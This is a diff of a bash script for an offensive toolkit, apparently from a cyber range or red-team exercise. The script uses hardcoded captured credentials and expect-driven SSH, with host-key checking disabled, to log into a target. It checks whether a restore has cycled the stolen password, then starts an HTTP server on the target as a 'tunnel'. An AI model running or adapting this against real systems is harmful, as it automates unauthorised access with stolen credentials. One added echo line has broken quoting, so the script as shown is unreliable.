@@ -1,34 +1,73 @@
 #!/bin/bash
+#Defined here to account for restore time check
+TARGET_IP="$1"
+USERNAME="cindy"
+PASSWORD="D1r3ct0rIT"
+PASSFILE="/home/ncraf/castleexploits/passfile"
 
 # Define the counter directory
 COUNTER_DIR="/home/ncraf/castleexploits"
 
 # Check if "passfile" exists
 if [ ! -f "$COUNTER_DIR/passfile" ]; then
+    echo "No credentials to this system have been obtained. Check for passfile in castleexploits."
     exit 0
 fi
 
-# Navigate to the counter directory
+#Compare "passfile" time-since-"creation" to target system uptime. If uptime is lower than the passfile, a restore must have taken place.
+passfile_mtime=$(stat -c %Y "$PASSFILE")
+
+#Use expect to SSH into the remote machine and get its uptime (transition to other ssh block setup if necessary)
+remote_uptime=$(expect -c "
+spawn ssh $USERNAME@$TARGET_IP \"cat /proc/uptime\"
+expect {
+    \"*yes/no*\" { send \"yes\r\"; exp_continue }
+    \"*assword:*\" { send \"$PASSWORD\r\"; exp_continue }
+    eof
+}
+" | awk '{print \$1}' | head -n 1)
+
+#Check if remote_uptime was retrieved
+if [ -z "$remote_uptime" ]; then
+    echo "Failed to retrieve remote uptime."
+    exit 1
+fi
+
+#Get current time (in seconds since epoch for numeric comparison)
+current_time=$(date +%s)
+
+#Calculate remote boot time (current time minus remote uptime)
+remote_boot_time=$(echo "$current_time - $remote_uptime" | bc)
+
+# Compare remote boot time with passfile modification time
+if (( $(echo "$remote_boot_time > $passfile_mtime" | bc -l) )); then
+    echo "Must re-exploit! Creds have cycled upon target machine restoration"
+    exit 0
+else
+    # Continue with the script or exit gracefully
+    echo "Passfile is good! "Tunnel" opening now!
+fi
+
+#Navigate to the counter directory
 cd "$COUNTER_DIR"
 
-# Check for a 5-digit numeric filename (60000-61000)
+#Check for a 5-digit numeric filename (60000-61000)
 counter=$(ls | grep -E '^[0-9]{5}$' | head -n 1)
 
-# If the counter file doesn't exist or doesn't match a 5-digit number, start at 60000
+#If the counter file doesn't exist or doesn't match a 5-digit number, start at 60000
 if ! [[ $counter =~ ^[0-9]{5}$ ]]; then
     counter=60000
     touch $counter
 fi
 
-# SSH to the target system and start the Python HTTP server
-TARGET_IP="$1"
+#SSH to the target system and start the Python HTTP server
 
 if [ -z "$TARGET_IP" ]; then
     echo "Usage: $0 <target_ip>"
     exit 1
 fi
 
-# Use expect to automate SSH login and command execution
+#Use expect to automate SSH login and command execution
 expect << EOF
 set timeout -1
 spawn ssh -o StrictHostKeyChecking=no cindy@$TARGET_IP
@@ -40,9 +79,9 @@ send "exit\r"
 expect eof
 EOF
 
-# Increment the counter
+#Increment the counter
 newPort=$((counter + 1))
 
-# Update the counter file
+#Update the counter file
 touch $newPort
 rm $counter
